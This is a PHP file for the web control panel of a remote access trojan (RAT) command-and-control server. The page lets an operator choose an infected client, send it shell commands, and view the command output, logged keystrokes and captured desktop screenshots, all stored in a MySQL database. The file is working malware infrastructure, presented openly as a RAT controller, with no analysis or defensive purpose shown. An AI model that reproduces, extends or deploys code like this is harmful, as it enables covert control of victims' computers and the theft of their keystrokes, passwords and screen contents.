<?php  
session_start();

// Redirect to login page if the user is not logged in
if (!isset($_SESSION['username'])) {
    header("Location: ./auth/login.php");
    exit();
}

// Ensure the client is passed as GET or POST parameter
if (isset($_GET['client']) && !empty($_GET['client'])) {
    $client = htmlspecialchars($_GET['client']); // Sanitize user input
} elseif (isset($_POST['client']) && !empty($_POST['client'])) {
    $client = htmlspecialchars($_POST['client']); // Sanitize user input
} else {
    $client = 'no client';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Control Server</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f7f7f7;
      padding: 20px;
      margin: 0;
    }

    .container {
      max-width: 900px;
      margin: 0 auto;
      background-color: #ffffff;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      padding: 20px;
    }

    h2 {
      text-align: center;
      color: #333;
    }

    .form-group {
      margin-bottom: 15px;
    }

    .form-group input[type="text"],
    .form-group input[type="submit"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .form-group input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
    }

    .form-group input[type="submit"]:hover {
      background-color: #45a049;
    }

    .form-group a {
      display: inline-block;
      margin-top: 10px;
      color: #007BFF;
      text-decoration: none;
    }

    .form-group a:hover {
      text-decoration: underline;
    }

    .textarea-container {
      margin-top: 20px;
      text-align: center;
    }

    textarea {
      width: 80%;
      height: 200px;
      margin-top: 10px;
      font-size: 1.1em;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    .button-container {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }

    .button-container button {
      padding: 10px 20px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .button-container button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Client RAT Administration</h2>
    <form method="post" action="openClient.php" id="cmdform">
      <div class="form-group">
        RAT Client Name: <input type="text" name="client" readonly value="<?php echo $client ?>"/>
      </div>
      <div class="form-group">
        <label for="cmdstr">Please enter your command:</label>
        <input type="text" name="cmdstr" id="cmdstr" placeholder="Enter command">
      </div>
      <div class="button-container">
        <button type="submit" name="buttonExecute">Execute</button>
        <button type="submit" name="buttonGetResult">Get Return String</button>
        <button type="submit" name="buttonGetKeylog">Get Keylog</button>
        <button type="submit" name="buttonGetDesktop">Get Desktop</button>
      </div>
      <div class="form-group">
        <a href='./index.php'>Back to Main</a>
      </div>
    </form>

    <div class="textarea-container">
      <?php
      // Database connection
      $db = new mysqli('localhost', 'root', '', 'control_server');
      if (mysqli_connect_errno()) {
          die("Failed to connect to database: " . mysqli_connect_error());
      }

      if (isset($_POST['buttonExecute'])) {
          if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
              $cmdstr = htmlspecialchars($_POST['cmdstr']); // Sanitize user input
              echo 'Received: ' . $cmdstr . '<br>';

              $query = "UPDATE clients SET cmd=? WHERE name=?";
              $stmt = $db->prepare($query);
              if ($stmt) {
                  $stmt->bind_param('ss', $cmdstr, $client);
                  $stmt->execute();
                  $stmt->close();
              } else {
                  echo "Error preparing query.";
              }
          }
      } elseif (isset($_POST['buttonGetResult'])) {
          $query = "SELECT retstr FROM clients WHERE name=?";
          $stmt = $db->prepare($query);
          if ($stmt) {
              $stmt->bind_param('s', $client);
              $stmt->execute();
              $stmt->store_result();
              $stmt->bind_result($retStr);
              $stmt->fetch();
              echo "<textarea readonly>" . $retStr . "</textarea>";
              $stmt->close();
          } else {
              echo "Error preparing query.";
          }
      } elseif (isset($_POST['buttonGetKeylog'])) {
          $query = "SELECT keylog FROM clients WHERE name=?";
          $stmt = $db->prepare($query);
          if ($stmt) {
              $stmt->bind_param('s', $client);
              $stmt->execute();
              $stmt->store_result();
              $stmt->bind_result($keylog);
              $stmt->fetch();
              echo "<textarea readonly>" . $keylog . "</textarea>";
              $stmt->close();
          } else {
              echo "Error preparing query.";
          }
      } elseif (isset($_POST['buttonGetDesktop'])) {
          $query = "SELECT desktop FROM clients WHERE name=?";
          $stmt = $db->prepare($query);
          if ($stmt) {
              $stmt->bind_param('s', $client);
              $stmt->execute();
              $stmt->store_result();
              $stmt->bind_result($desktop);
              $stmt->fetch();
              if ($desktop) {
                  echo "<img width='600' src='data:image/jpeg;base64," . base64_encode($desktop) . "' />";
              } else {
                  echo "No desktop data found.";
              }
              $stmt->close();
          } else {
              echo "Error preparing query.";
          }
      }

      // Close the database connection
      $db->close();
      ?>
    </div>
  </div>
</body>
</html>
